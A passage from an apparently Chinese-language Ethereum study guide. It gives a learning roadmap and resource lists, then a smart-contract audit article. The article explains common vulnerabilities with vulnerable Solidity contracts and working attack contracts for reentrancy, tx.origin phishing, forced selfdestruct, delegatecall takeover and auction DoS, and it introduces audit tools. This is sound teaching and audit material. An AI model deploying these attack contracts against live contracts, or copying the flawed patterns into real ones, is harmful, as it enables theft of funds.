geth，因为它时最主流也是最活跃的区块链项目。\n对于合约开发方向，深入底层似乎有些有些不必要了，但是对于合约安全来说，接下来的内容可能才算开始“入门”。\n\n 理解以太坊最重要的数据组织形式：状态树、收据树、交易树\n\n 掌握 Trie Tree、Patrica Tree、Merkle Tree 的数据结构基础。\n 掌握重要的编码方式： HP 编码、 RLP 编码。\n\n\n 看懂源码中的 core 部分，从源码实现层次\n\n 理解区块链中的数据结构的确切定义和实现的方法。例如，从代码层次，掌握 block、transction、log、receipt 的定义和对应的方法。\n 理解创世块的的生成方式\n 看懂交易池（非常重要），例如交易排序、并发执行、交易广播实时更新数据\n 看懂交易广播、区块形成过程等等\n\n\n 掌握合约的常见漏洞和审计工具的使用\n\n第三部分：高级智能合约安全研究\n\n 深入理解字节码，合约存储、链上和链下数据完整性和安全性方案\n 掌握合约安全分析的方法，理解原理，包括\n\n 用机器学习方法分析\n 符号执行方法\n 模糊测试分析\n 污点分析\n 形式验证分析\n\n\n 掌握区块链系统态势感知模型，能够设计系统方案，动态、整体地监控链上数据，并且自动分析可能的安全威胁。\n\n资源汇总\n这些资源主要来自笔者的经历和学习，也参考了许多人的总结，作为自己的系统作结，应该对大家有帮助。\n帮助和交流平台\n\ngitter 在线频道。\nreddit ethereum 讨论区\n以太坊的 stackexchange\nstackoverflow\n\n还有一些 discord 服务器，感兴趣可以加入。\n优质社区\n\n以太坊社区网络，他们的文章整理的不错，文档也很好。\n\n\n\n\n以太坊维基百科，可以浏览基本的概念，很有帮助。\n\n\n以太坊基金会博客，可以得到很多前沿信息。\n\n\n\n\n登链社区，许多翻译的文章质量很高，并且有一些文档翻译。\n以太坊知识库，虽然许多东西没有更新，但是有些文章翻译的很好，例如 新手入门、以及它开发者提供的参考 都可以看出来是花了很长时间整理的，可以浏览，增长见识。比较可惜的是，后续没有继续更新，可能是小白成为大佬的过程常常写很多的文章，但是成为大佬后都应对复杂问题，就没有继续写下去了吧。\n\n\n\nlayer2 方案的备忘录，以后深入以太坊拓展方案后可以很快对 layer2 有大致的认识。\nmedium 虽然是英文社区，但是里面的优秀文章写的很好，建议翻译慢慢看。\n\n\n\nEth2 展望和分享，作者经常分享自己对以太坊升级的看法和资讯。\n\n\n入门参考\n\n《以太坊的指南针》 ‒ 以太坊的指南针 1.0.0 documentation 面向 没接触过以太坊的人 的书。\n以太坊的入门级简单文档\n区块链概念和基础（基于比特币）\n官方文档，内容可能比较简洁，相对深入，可以量力而行。\n《精通以太坊》前面的内容适合入门，后面的内容需要一定的基础，可日后再回顾。开源书，有中文版。\n\n\n智能合约合约教程\n\n\n合约编写示例\n\n\n笔者的笔记\n\n\n中文文档\n\n\n编游戏的同时学习以太坊 DApp 开发\n虽然这个教程比较老，但是比较有趣\n\n\n介绍 Solidity 细节的视频（在Youtube上）\n\n\n系统性的合约开发教程 （在Youtube上）\n\n\n区块浏览器\n\nEtherscan – 中文、韩文、俄文和日文\nEtherchain\nEthplorer - 支持中文、西班牙语、法语、土耳其语和俄语\nBlockchair —也有西班牙文、法文、意大利文、荷兰文、葡萄牙文、俄文、中文和波斯文\nBlockscout—区块链浏览器\nOKLink\nbeaconcha.in/\nbeaconscan.com/\neth2stats.io/\nethscan.org/（beaconcha.in 的分叉）\n\n一些特殊的浏览器\n\n统计被销毁的 ETH\n节点信息和链状态概览。\n\n合约库\n\ncontracts 提供了常见的合约库，实现了一些标准库，如 ERC20、ERC721，仓库中可阅读源码。\n\n\n\ndappsys 是一个新兴的合约库，用法参见文档文档\n\n\n\nHQ20 里提供里许多的合约和他们的测试脚本，可以作为自己开发的组件。\n\n集成开发工具\nTruffle+Ganache\n使用开发环境可以加快重复性任务，例如 Truffle 主要完成以下工作：\n\n编制合同\n部署合约\n调试合约\n升级合约\n运行单元测试\n\n\nGanache 最近升级后功能强大了许多，可以提供本地私链的测试环境，而且还支持其他功能。\n\n其次，truffle 有很多的插件，\n\ntruffle-plugin-verify - 验证 Etherscan 上的特定地址的智能合约代码是否和本地相同\ntruffle -security - 对智能合约运行 MythX 安全分析。\ntruffle-contract-size - 以千字节显示智能合约的大小。\ntruffle-plugin-abigen - 生成与 Geth 兼容的abigen数据，用于为以太坊合约构建 Golang 绑定\nopenzeppelin-upgrades 可升级合约插件\nsolidity-coverage 检查测试的覆盖性。\n\n官网中还介绍了其他的开发框架：\nHardhat\nhardhat 的堆栈跟踪功能很强大，报错信息相对更具有可读性，而且主网分叉功能也很赞。\n\n\nhardhat.org，除了官网也有国人不完全的翻译。\nGitHub\n\n**Brownie - **基于 Python 的开发环境和测试框架。\n\n相关文档\nGitHub\n\nEmbark - 开发环境、测试框架以及与以太坊、IPFS 和 Whisper 集成的其他工具。\n\n\n相关文档\nGitHub\n\nEpirus - 在 JVM 上开发区块链应用程序的平台。\n\n主页\n相关文档\nGitHub\n\nOpenZeppelin SDK - 工具包：一套帮助您开发、编译、升级、部署智能合约并与之交互的工具。\n\n\nOpenZepelin SDK\n\n\nGitHub\n\n\n社区论坛\n\n\ngithub.com/PaulRBerg/create-eth-app/tree/develop/templates)\n\n\nThe Graph - 链上信息查询的API\n\n网站\n使用教程\n\nAlchemy - layer2 平台提供的开发套件。\n\nalchemy.com\nGitHub\nDiscord\n\nDapptools - 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。\n\n主页\nGitHub\n\n\n看官网朴实的介绍，确实很符合 unix 极简主义的哲学\n关于其他集成开发工具的介绍，可以见 2022十大智能合约开发工具\n与合约交互的库\nWeb3.js - 是使用的非常广泛的库，包含完整的合约交互和查询函数\n\n最新英文文档，也有翻译的中文文档。web3.js 经过了 0.2 到 1.0 的大版本更新，使用时需要注意用法的不同。\nGitHub\n\nEthers.js - 现在的主流库，hardhat 框架也主要用到它。\n\n文档\nGitHub\n\nGraph - 比较新的使用 GraphQL 的信息查询的库，配套有信息查询平台。\n\nGraph\nGraph Explorer\n相关文档\nGitHub\n\nAlchemyweb3 - 封装后的 Web3.js 的库，Alchemy 的配套生态\n\n相关文档\nGitHub\n\nWeb3j - Java 的API\n\nGitHub\n\n\nWeb3.py - 用于与以太坊交互的 Python 库\n\nGitHub\n文档\n\nDApp 的前端库\n前端链接钱包往往需要阅读不同的钱包的文档，然后针对性的写代码，这是重复性的工作，因此有相应的库完成了这个工作。\n\nblocknative 不只提供了连接钱包的接口，而且还提供了监控内存池、交易池的接口。\n\n\n\nweb3modal 提供链接钱包的 UI 和封装。\n\n\n\n\nweb3-react 为前端 React 提供的 DAPP 开发组件。\n\n\n创建 Eth App - 一大量的创建 DApp 的模板\n\nGitHub\n\n\n\nScaffold-Eth - Ethers.js + Hardhat + React 的 DApp 模板\n\nGitHub\n\n\n\n\nDrizzle 擅长大量状态管理的前端库。\n\n\n\n安全审计\n\nMythril 是 EVM 字节码的安全分析工具。它使用符号执行、SMT 解决和污点分析来检测各种安全漏洞。\nSlither 是一个用 Python 3 编写的 Solidity 静态分析框架。\nManticore 是用于分析智能合约和二进制文件的符号执行工具。\nEchidna 是一个 Haskell 程序，旨在对以太坊智能合约进行模糊测试/基于属性的测试。\ntenderly 是集成、开发、测试模拟的平台，主网分叉的功能很赞。\n\n这方面的内容，我会在后续合约审计文章中详细说明各种工具的使用和原理。\n漏洞分析博客\n\n慢雾科技的安全技术探究 里面会分享漏洞分析的报告。\n合约漏洞赏金平台 immunefi，在上面提交漏洞报告，不仅可以得到丰厚的回报，也会收获行业声誉，也提供了智能合约安全的教程。\n\n\n\nrekt 是分享漏洞和攻击事件的平台。\n\n\n\nEIP-1470 提出的漏洞分类\nCTF 竞赛中合约安全方面的题目\n\n\n\n找合约的漏洞的挑战\n\n\n\n合约安全游戏\n\n\n各语言的区块链开发\n以下资源包来自以太坊官网，主要是各种语言参与区块链开发的指导，虽然许多没有翻译，但是仍然很有参考意义，因此搬运过来了：\n根据您的语言选择项目资源和虚拟社区：\n\n面向 Java 开发者的以太坊资源\n面向 Python 开发者的以太坊资源\n面向 JavaScript 开发者的以太坊资源\n面向 Go 开发者的以太坊资源\n面向 Rust 开发者的以太坊资源\n面向 .NET 开发者的以太坊资源\n面向 Delphi 开发者的以太坊资源\n面向 Dart 开发者的以太坊资源\n\n底层源码参考\n\n简书博客，最初发表的文章主要是以太坊源码分析，对以太坊的函数做了说明。\n最近的源码分析文章\nGitHub - ZtesoftCS/go-ethereum-code-analysis 4年前的源码分析汇总\n[go-ethereum 源码笔记（概览）](knarfeh.com/2018/03/10/go-ethereum 源码笔记（概览）/) 四年前的博客\nIntroduction · Ethereum Development with Go 跟着用 Go 写简单区块链\nGeth Documentation | Go Ethereum geth 使用说明，调试程序，使用自带工具的参考。\n操作码详解和模拟。\n以太坊技术与实现，作者作了整体性的说明，适合作为大致参考。\n笔者的源码分析和理论基础、调试实操。\n\n参考资料\n\nsmart-contract-development-best-practices\ngithub.com/blockchainGuide/blockchainguide\nethereum.org/zh/\n"},"blockchainguide/DApp_Development/智能合约审计":{"slug":"blockchainguide/DApp_Development/智能合约审计","filePath":"blockchainguide/DApp_Development/智能合约审计.md","title":"智能合约审计","links":["openzeppelin/contracts"],"tags":[],"content":"智能合约审计\n常见漏洞\n以下总结的常见漏洞基本涵盖一般的漏洞类型，部分内容可能过于细致，或许有更加合理的分类方法。不过，应该能给大家提供一定的参考。\n整数溢出\n注意，Solidity 0.8.0 开始，加入了自动检查溢出，此版本之后的合约，可不必担心这个漏洞。\n下面用 Beauty Chain 的例子说明，源码在这里，可见如下：\n从区块链浏览器将代码复制到 remix IDE，仔细看第 259行的 batchTransfer 函数，它用于给地址列表中的所有地址都转账 _value：\n  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n    uint cnt = _receivers.length;\n    uint256 amount = uint256(cnt) * _value;\n    require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20);\n    require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);\n \n    balances[msg.sender] = balances[msg.sender].sub(amount);\n    for (uint i = 0; i &lt; cnt; i++) {\n        balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n        Transfer(msg.sender, _receivers[i], _value);\n    }\n    return true;\n  }\n但是没有检查 amount 是否溢出，这导致每个人的转账金额 _value 很大，但是总共的 amount 却接近0.\n重入攻击\n当攻击者调用储币合约中的 withdraw 函数时，withdraw 使用 call 底层调用发送以太币，此时接收者是攻击者的 fallback 函数，因此如果在 fallback 函数中重新调用 withdraw 函数，并且没有检查机制，就会发生重入攻击。代码来自这里。如果不清楚 fallback 函数或者 receive 函数，可以看笔记。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract EtherStore {\n    mapping(address =&gt; uint) public balances;\n \n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n \n    function withdraw() public {\n        uint bal = balances[msg.sender];\n        require(bal &gt; 0);\n \n        (bool sent, ) = msg.sender.call{value: bal}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n \n        balances[msg.sender] = 0;\n    }\n \n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n \ncontract Attack {\n    EtherStore public etherStore;\n \n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n \n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance &gt;= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n \n    function attack() external payable {\n        require(msg.value &gt;= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n \n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n \n\n先部署 EtherStore，然后分别用不同的账户 调用 deposit 函数，单位选择 ether，value 为 1.\n\n\n\n\n复制 EtherStore 合约地址，作为构造函数参数，选择 Attack 合约，部署(注意去除部署时地址的双引号)!\n\n\n\n选择新的账户，同样单位选择 ether，value 为 1，调用 attack 函数，可见 Attackt 合约的账户余额增加，EtherStore 的账户余额归零。\n\n最后，感兴趣的话可以阅读 theDAO 的源码，漏洞所在的函数为 splitDAO\npayable 函数导致合约余额更新\n因为当执行函数之前，合约首先是读取交易对象，因此合约的余额会先改变成 原来的余额+msg.value，某些合约可能会未注意合约余额已发生改变，导致漏洞。\n// SPDX-License-Identifier: MIT\n \npragma solidity ^0.8.0;\n \ncontract payableFunc {\n    address public Owner;\n \n    constructor() payable {\n        Owner = msg.sender;\n    }\n \n    receive() external payable {}\n \n    function withdraw() public payable {\n        require(msg.sender == Owner);\n        payable(Owner).transfer(address(this).balance);\n    }\n \n    function multiplicate(address adr) public payable {\n        if (msg.value &gt;= address(this).balance) {\n            payable(adr).transfer(address(this).balance + msg.value);\n        }\n    }\n}\n这里的 multiplicate 函数 msg.value &gt;= address(this).balance 永远不可能为真。\ntx.origin\n用交易的发起者作为判断条件，可能会被精心设计的回退函数利用，转而调用其他的合约，tx.origin 仍然是最初的交易发起者，但是执行人却已经改变了。\n如下面 phish 合约中的 withdrawAll 函数的要求的是 tx.origin = owner，那么如果是 owner 向 TxOrigin 合约发送以太币，就会触发 fallback 函数，在 attack 函数中调用 withdrawAll 函数，窃取以太币。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract phish {\n    address public owner;\n    constructor () {\n    owner = msg.sender;\n    }\n    receive() external payable{}\n \n    fallback() external payable{}\n \n    function withdrawAll (address payable _recipient) public {\n        require(tx.origin == owner);\n        _recipient.transfer(address(this).balance);\n    }\n    function getOwner() public view returns(address) {\n        return owner;\n    }\n}\n \ncontract TxOrigin {\n    address  owner;\n    phish PH;\n \n    constructor(address phishAddr) {\n        owner = msg.sender;\n        PH=phish(payable(phishAddr));\n    }\n \n    function attack() internal {\n        address phOwner = PH.getOwner();\n        if (phOwner == msg. sender) {\n            PH.withdrawAll(payable(owner));\n        } else {\n            payable(owner).transfer(address(this). balance);\n        }\n    }\n    fallback() external payable{\n        attack();\n    }\n}\n短地址攻击\n因为交易中的 data 参数是原始的调用数据经过 ABI 编码的数据，ABI 编码规则中常常会为了凑够 32 字节，在对原始参数编码时进行符号扩充（可见博客的应用二进制接口(ABI)）。因此，如果输入的地址太短，那么编码时不会检查，就会直接补零，导致接收者改变。\n挖矿属性依赖\n合约中有部分内置变量，这些变量会受到矿工的影响，因此不应该把它们当作特定的判断条件。\n// SPDX-License-Identifier: MIT\n \npragma solidity ^0.8.0;\ncontract Roulette {\n    uint public pastBlockTime;\n    fallback() external payable {\n        require(msg.value == 10 ether);\n        require(block.timestamp != pastBlockTime);\n        pastBlockTime = block.timestamp;\n        if(block.timestamp % 15 == 0){//依赖了区块时间戳\n        payable(msg.sender).transfer(address(this).balance);\n        }   \n    }\n}\n合约余额依赖\nselfdestruct 函数是内置的强制执行的函数，因此即使合约并没有可接受以太币的方法，其他人也可以强制通过 selfdestruct 函数改变合约的余额。因此，需要仔细检查是否把合约余额当作判断标准。\n例如下面的合约，规定只有恰好为 7 ether 才能胜出，但是攻击者可以通过 selfdestruct 函数让没有人能够达到 7 ether.\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n \n    function deposit() public payable {\n        require(msg.value == 1 ether, &quot;You can only send 1 Ether&quot;);\n \n        uint balance = address(this).balance;\n        require(balance &lt;= targetAmount, &quot;Game is over&quot;);//只有合约余额达到 7 ether 才能成功\n \n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n \n    function claimReward() public {\n        require(msg.sender == winner, &quot;Not winner&quot;);\n \n        (bool sent, ) = msg.sender.call{value: address(this).balance}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n    }\n}\n \ncontract Attack {\n    EtherGame etherGame;\n \n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n \n    function attack() public payable {\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n \n数据私有属性的误解\n标注为 private 区域的数据并不是不能访问，它们存储在一个又一个的 slot 里，如果读者不熟悉的话，可以阅读博客中关于 EVM 的存储空间的解释。\ndelegatecall\n代理调用时会用调用者的上下文替代被调用者的上下文，例如下面 HackMe 中的回退函代理调用 lib 的 pwn 函数时，在 lib 中的变量 owner 将会是 HackMe 中的 owner，因此 pwn() 中修改的实际上的 HackMe 的 owner，msg 对象是 HackMe 中的 msg 对象，也就是调用 HackMe 的人。\n例如：\nAttack.attack  调用 HackMe ，然后找不到 pwn() 这个函数签名，因此跳转到回退函数，然后回退函数调用 Lib，匹配到了函数签名，但是由于上下文切换，造成了 HackMe 的全局变量被意外修改。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract Lib {\n    address public owner;\n \n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n \ncontract HackMe {\n    address public owner;\n    Lib public lib;\n \n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n \n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n \ncontract Attack {\n    address public hackMe;\n \n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n \n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(&quot;pwn()&quot;));\n    }\n}\n \n拒绝服务攻击\n依赖某些特定条件才能执行的逻辑，如果有人恶意破坏并且没有检查是否满足条件，就会造成服务中断。\n例如下面的例子：依赖接收者可以接收以太币，但是如果接收以太币的合约无 receive 函数或者 fallback 函数，就会让逻辑无法进行下去。\n多人竞拍，如果有出价更高的则退回上个一竞拍者的以太币，并且更新胜出者 king 和当前标价 balance，Attack 合约参与竞拍，但是无法退回以太币给它，导致 DOS。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract KingOfEther {\n    address public king;\n    uint public balance;\n \n    function claimThrone() external payable {\n        require(msg.value &gt; balance, &quot;Need to pay more to become the king&quot;);\n \n        (bool sent, ) = king.call{value: balance}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n \n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n \ncontract Attack {\n    KingOfEther kingOfEther;\n \n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n \n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n \n交易顺序依赖\n某些合约依赖收到交易地顺序，例如某些竞猜或者首发，“第一个” 之类的要求，那么就容易出现抢跑 (front run) 的情况。再例如，利用不同代币汇率差别，观察交易池，抢先在汇率变化之前完成交易。\n下面是通过哈希值竞猜，观察交易池，以更高的 gasprice 抢跑。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract FindThisHash {\n    bytes32 public constant hash =\n        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n \n    constructor() payable {}\n \n    function solve(string memory solution) public {\n        require(hash == keccak256(abi.encodePacked(solution)), &quot;Incorrect answer&quot;);\n \n        (bool sent, ) = msg.sender.call{value: 10 ether}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n    }\n}\n \n使用未初始化的内存\n根据 Solidity 的编译器，如果需要临时存储的操作需要大于 64 字节的空间，那么不会放入 0x00-0x3f 的暂存空间，又考虑到临时存储的生命周期很短，因此直接在当前内存指针的下一个位置写入，但是内存指针不变，0x40-0x5f 记录的内存大小也不变，然后继续写入内存时直接覆盖。因此，在直接操作未使用的内存时，这块内存可能不是初始值。\n如果在函数中声明 memory 变量，它可能不是初始值。\n权限设置不当\n取币、自毁操作需要设置严格的权限。建议非必要，不要设置 selfdestruct 函数。\n合约实例偷换地址\n例如，下面的 Bank 合约具有重入漏洞，似乎也只是多了一个 Logger 合约作为日志记录者。但是实际上，部署 Bank 的人可以在部署 Bank 时不填 Logger 的地址，而是直接填入 HoneyPot 的地址。在合约实例的名字的误导下，如果不去检查合约实例的地址上是否真的为预期内的代码，那么很容易上当。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \ncontract Bank {\n    mapping(address =&gt; uint) public balances;\n    Logger logger;\n \n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n \n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, &quot;Deposit&quot;);\n    }\n \n    function withdraw(uint _amount) public {\n        require(_amount &lt;= balances[msg.sender], &quot;Insufficient funds&quot;);\n \n        (bool sent, ) = msg.sender.call{value: _amount}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n \n        balances[msg.sender] -= _amount;\n \n        logger.log(msg.sender, _amount, &quot;Withdraw&quot;);\n    }\n}\n \ncontract Logger {\n    event Log(address caller, uint amount, string action);\n \n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n \n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n \n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n \n    fallback() external payable {\n        if (address(bank).balance &gt;= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n \n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n \n// Let&#039;s say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, &quot;Withdraw&quot;)) {\n            revert(&quot;It&#039;s a trap&quot;);\n        }\n    }\n \n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n \n未检查底层调用结果\ncall 这类底层调用的方式失败并不会发生回滚。因此，攻击者可以精心设计 gas，让底层调用回滚，而其他语句继续运行。\n签名重放\n一般而言，签名会和特定的交易或者消息绑定，但是为了业务逻辑自己设计的多重签名，可能会疏忽造成签名重复使用。例如下面的 transfer 函数，通过库合约恢复发送者地址，但是如果签名是可重用的，那么就会造成意外的取款行为。\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma experimental ABIEncoderV2;\n \nimport &quot;github.com/OpenZeppelin/openzeppelin-contracts/blob/b0cf6fbb7a70f31527f36579ad644e1cf12fdf4e/contracts/utils/cryptography/ECDSA.sol&quot;;\n \ncontract MultiSigWallet {\n    using ECDSA for bytes32;\n \n    address[2] public owners;\n \n    constructor(address[2] memory _owners) payable {\n        owners = _owners;\n    }\n \n    function deposit() external payable {}\n \n    function transfer(\n        address _to,\n        uint _amount,\n        bytes[2] memory _sigs\n    ) external {\n        bytes32 txHash = getTxHash(_to, _amount);\n        require(_checkSigs(_sigs, txHash), &quot;invalid sig&quot;);\n \n        (bool sent, ) = _to.call{value: _amount}(&quot;&quot;);\n        require(sent, &quot;Failed to send Ether&quot;);\n    }\n \n    function getTxHash(address _to, uint _amount) public view returns (bytes32) {\n        return keccak256(abi.encodePacked(_to, _amount));\n    }\n \n    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)\n        private\n        view\n        returns (bool)\n    {\n        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();\n \n        for (uint i = 0; i &lt; _sigs.length; i++) {\n            address signer = ethSignedHash.recover(_sigs[i]);\n            bool valid = signer == owners[i];\n \n            if (!valid) {\n                return false;\n            }\n        }\n \n        return true;\n    }\n}\n开源审计工具\n建议在 linux 或者 MacOS 下运行。\nmythril\nMythril 是 EVM 字节码的安全分析工具。它检测以太坊、Hedera、Quorum、Vechain、Roostock、Tron 和其他与 EVM 兼容的区块链构建的智能合约中的安全漏洞。它使用静态分析的方法，如符号执行、SMT 解决和污点分析来检测各种安全漏洞。另外，他还有收费版本的 MythX。\n在我实际使用时，我发现他的漏洞检测只局限在少数几个简单的漏洞，如溢出、重入等。我感觉不是很满意，也许主要精力去做收费版了，这个开源版本维护的很少。\n使用示例\n安装编译器\npip3 install solc-select\nsolc-select install 0.8.7\nsolc-select use 0.8.7\n\n安装 mythril\npip3 install mythril\n\n开始\nmyth analyze &lt;solidity-file&gt;\n\nOR\nmyth analyze -a &lt;contract-address&gt;\n\n当我们学习静态分析后，将会再次详细介绍 mythril 的原理。\nechidna\nEchidna 用 Haskell 语言写的，用于对以太坊智能合约进行模糊测试或者基于属性的测试。它使用基于 ABI 和语法的模糊测试，通过断言判断结果是否与预期相同。\n特点：\n\n自动生成适合的输入\n可选的语料库、变异库和覆盖率指南，以发现更深层次的错误\n在模糊测试之前由 Slither 提取有用信息\n能够指出模糊测试覆盖哪些行\n自动测试用例最小化以进行快速分类\n支持使用Etheno和 Truffle进行复杂的合约初始化\n\n使用示例\n首先需要指定断言函数，它的返回值应该永远为不变量。然后 echida 会生成一系列的测试用例，检查断言函数的返回值是否为真。\n断言函数的写法：\n\n必须使用前缀 echidna_\n参数为空\n返回预期永远为 true 或者 false 的布尔值\n\nfunction echidna_check_balance() public returns (bool) {\n    return(balance &gt;= 20);\n}\n编写好之后直接使用\nechidna-test myContract.sol --corpus-dir .；\n\n它会在当前文件夹下保留测试用例和程序的终止执行的地方，更加详细的见工具的 repo。\n测试范例：\n运行时需要使用合适版本的 solc\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \ncontract Test {\n    event Flag(bool);\n \n    bool private flag0 = true;\n    bool private flag1 = true;\n \n    function set0(int256 val) public returns (bool) {\n        if (val % 100 == 0) flag0 = false;\n    }\n \n    function set1(int256 val) public returns (bool) {\n        if (val % 10 == 0 &amp;&amp; !flag0) flag1 = false;\n    }\n \n    function echidna_alwaystrue() public pure returns (bool) {\n        return (true);\n    }\n \n    function echidna_revert_always() public pure returns (bool) {\n        revert();\n    }\n \n    function echidna_sometimesfalse() public returns (bool) {\n        emit Flag(flag0);\n        emit Flag(flag1);\n        return (flag1);\n    }\n}\nSlither\nSlither 是一个用 Python 3 编写的 Solidity 静态分析框架。它运行一套漏洞检测器，打印有关合约细节的可视信息，并提供一个 API 来轻松编写自定义分析。Slither 使开发人员能够发现漏洞，增强他们的代码理解能力，并能够快速自定义分析。\n使用示例\n在 Truffle/Embark/Dapp/Etherlime/Hardhat 应用程序上运行 Slither：\nslither .\n\n在单个文件上运行 Slither：\nslither tests/uninitialized.sol\n\n建议安装 solc-select，他会自动下载、切换编译器版本，然后可以直接从主网拉取合约\nslither 0x7F37f78cBD74481E593F9C737776F7113d76B315\n\n这个工具比 mythril 强大许多，运行效率也高非常多，很快就能出结果，结果也高亮显示，很舒服。\n\n检测器\nslither 集成了许多的检测器，不同的检测器各自可以检测不同类型的漏洞，默认执行所有检测器，当然也可以指定只是用那几个检测器。\n打印器\nslither 除了能检测合约的漏洞，还提供了许多其他有用的功能。可以直观分析\n\n合约的控制流\n调用关系图\n函数将会执行的操作码\n继承关系图\n等等\n\n这些工具对合约审计人员非常有帮助\n例如分析调用关系\nslither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print call-graph\n\n生成了点图，需要安装查看点图软件\nsudo apt install graphviz\nsudo apt install gir1.2-gtk-3.0 python3-gi python3-gi-cairo python3-numpy graphviz\npip3 install xdot\n\n然后可以用 xdot 查看流程图，也可以转换成图片\ndot 0xC5d105E63711398aF9bbff092d4B6769c82f793d.all_contracts.call-graph.dot -Tpng -o call_graph.pn\n\n\n为了查看函数的操作码，需要安装控制流依赖\npip3 install evm-cfg-builder\n\n可以打印出来，这对合约的性能调优很有帮助。\nslither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print evm\n\n工具\nslither 还附带了一些工具，用于检查可升级合约代理、合约单约测试属性、代码扁平化（避免无意义的嵌套）、ERC 代币是否规范。\n\nslither-check-upgradeability: Review delegatecall-based upgradeability\nslither-prop: Automatic unit test and property generation\nslither-flat: Flatten a codebase\nslither-check-erc: Check the ERC’s conformance\nslither-format: Automatic patch generation\n\nmanticore\nmanticore 是基于符号执行方法的合约分析工具，它实际上也是通过断言，来判断是否满足某种属性。\n特点：\n\n给定输入，搜索可能的状态。\n自动生成输入信息。\n检测执行失败或者崩溃的地方。\n通过事件或者指令钩子，更精确的控制搜索路径。\n\n安装：\npip install &quot;manticore[native]&quot;\n\n分析合约：\nmanticore mcore.sol\n\n代码如下\n// Smart contract based on a classic symbolic execution example from slides\n// by Michael Hicks, University of Maryland.\n// www.cs.umd.edu/~mwh/se-tutorial/symbolic-exec.pdf\ncontract SymExExample {\n    function test_me(int a, int b, int c) public pure {\n        int x = 0;\n        int y = 0;\n        int z = 0;\n \n        if (a != 0) {\n            x = -2;\n        }\n \n        if (b &lt; 5) {\n            if (a == 0 &amp;&amp; c != 0) {\n                y = 1;\n            }\n            z = 2;\n        }\n \n        // will fail when: a == 0 &amp;&amp; b &lt; 5 &amp;&amp; c != 0\n        assert(x + y + z != 3);\n    }\n}\n\n如果运行 manticore 报错，请复制最后一行的提示信息，在谷歌搜索。大概率是依赖包版本问题。\n\n\n注意：由于遍历或者搜索的效率其实比较慢，可能需要运行很久。\n\n运行后将会生成很多辅助分析的材料，如何分析请见该项目文档。除此之外，也可以高度自定义，编写 python  代码，初始化合约状态，然后再检查不变量。\n检测漏洞：\n类似于断言的方法，判断合约是否满足某个属性，详细操作间见文档。\nscribble\n也是基于断言的审计工具，但是比较特殊的是，他可以很方便的扫描链上的合约，然后寻找漏洞。它自称是“基于属性的运行时验证工具”，我暂时还不清楚它使用的原理。感兴趣可以深入阅读它的文档。\nLegions\n他主要是提供了语法糖，可以简化节点的查询工作，比如不用每次查询余额都要写一串的 web3。\nvscode-solidity-auditor\n这是一个 vscode 